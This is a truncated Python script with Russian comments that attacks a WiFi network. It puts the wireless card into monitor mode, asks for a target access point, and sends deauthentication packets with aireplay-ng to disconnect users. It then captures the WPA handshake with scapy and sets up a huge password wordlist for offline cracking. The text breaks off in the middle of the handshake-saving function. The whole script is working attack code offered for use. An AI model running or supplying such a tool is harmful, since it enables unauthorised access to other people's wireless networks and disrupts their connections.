import os
import time
import requests
from scapy.all import *

# --- Конфигурация ---
hack_dir = "WiFiHack_Files"  # Папка для хранения файлов
iface = "wlan0"
mon_iface = "wlan0mon"
handshake_file = os.path.join(hack_dir, "handshake.pcap")
password_output = os.path.join(hack_dir, "passwords.txt")
wordlist_file = os.path.join(hack_dir, "weakpass.txt")
wordlist_url = "https://weakpass.com/wordlists/1851"  # 100M+ паролей (2GB)

# --- Создаём папку, если её нет ---
if not os.path.exists(hack_dir):
    os.makedirs(hack_dir)
    print(f"[+] Создана папка: {hack_dir}")

# --- Включаем режим мониторинга ---
print("[*] Включаем режим мониторинга...")
os.system(f"airmon-ng start {iface}")

# --- Запрашиваем BSSID и канал ---
bssid = input("Введите BSSID (MAC точки доступа): ").strip()
channel = input("Введите номер канала сети: ").strip()

# --- Переключаемся на нужный канал ---
print(f"[*] Переключаем интерфейс {mon_iface} на канал {channel}...")
os.system(f"iwconfig {mon_iface} channel {channel}")

# --- Функция для отправки deauth-пакетов ---
def deauth_attack(target_bssid):
    print(f"[*] Запуск deauth-атаки на {target_bssid}...")
    os.system(f"aireplay-ng --deauth 10 -a {target_bssid} {mon_iface}")

# --- Функция для захвата WPA handshake ---
def packet_handler(pkt):
    if pkt.haslayer(EAPOL):
        print(f"[+] Захвачен WPA handshake! Сохраняем в {handshake_file}...")
        wrpcap(hand
